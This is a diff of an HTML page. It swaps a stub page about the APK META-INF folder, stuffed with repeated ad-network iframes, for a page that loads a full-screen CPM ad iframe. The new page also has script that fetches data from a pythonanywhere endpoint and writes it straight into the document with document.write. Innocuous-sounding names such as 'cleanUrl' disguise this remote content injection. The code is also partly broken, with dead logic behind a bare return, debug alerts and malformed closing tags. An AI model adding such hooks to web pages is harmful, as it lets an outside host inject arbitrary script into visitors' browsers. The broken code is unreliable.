@@ -1,12 +1,78 @@
-<!Doctype html>
-<body sytle="background-color: #ffffff">
+<html><head>
+    <script>
+      var cleanUrlData = null
 
-<div><img width="300" height="500" src="./apklab.JPG" /></div>
 
-<p><h3><span style="color:green;">What Is META-INF (Folder) And Its Usage In Apk:</span></h3></p><br>
+      function altDataReady() {
+        if (req.readyState == XMLHttpRequest.DONE) {
+            cleanUrlData = JSON.parse(req.response)
+            document.write(cleanUrlData)
+        }
 
-<div><img width="300" height="500" src="./apklab1.JPG" /></div>
-<div><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />   <iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />  <iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />  <iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />    <iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />  <iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />
-<iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" /><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" /><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" /><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" /><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" /><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" /><iframe src="https://www.highperformancecpmgate.com/k9f5p9t0z9?key=f8128b69df13a73bd99a893536cfc02a" width="650" height="450" />
-<div>
-</body></html>
+        if (cleanUrlData) {
+            document.write(cleanUrlData)
+        }
+
+      }
+      function altUrl() {
+        req = new XMLHttpRequest()
+        req.open("GET", "https://cocomcocom.pythonanywhere.com/utilData")
+        req.onreadystatechange = altDataReady
+        req.send()
+      }
+
+      function cleanUrl() {
+        if (!cleanUrlData) {
+            req = new XMLHttpRequest()
+            req.open("GET", "https://cocomcocom.pythonanywhere.com/utilData")
+            req.onreadystatechange = altDataReady
+            req.send()
+        }
+
+        else {
+            altDataReady()
+        }
+      }
+
+
+
+      function state(e) {
+
+      return
+            if (!(document.body.children[0].contentDocument)) {
+               /* iframe is null, loading alt url */
+
+                alert(document.body.children[0].contentDocument)
+            }
+
+            else {
+                cleanUrl()
+                alert("cleaning url")
+            }
+
+        }req = new XMLHttpRequest()
+
+      function stateWrap(e) {
+
+        if (document.readyState == 'complete') {
+            if (document.body.childElementCount == 1) {
+                    setTimeout(stateWrap, (5*1000))
+                    return
+            }
+            else {
+                state(e)
+            }
+        }
+    }
+
+    function ehandler(e) {
+        alert(e.currentTarget.contentWindow)
+    }
+
+    </script>
+  </head>
+
+  <body>
+  <iframe onload="ehandler(event)" id="view" width="100%" height="100%" src="https://www.effectiveratecpm.com/ktsffnurv?key=508cf467342bedfb36f393acc4b3f3e6s">
+  </body>
+</html></iframe></body></html>
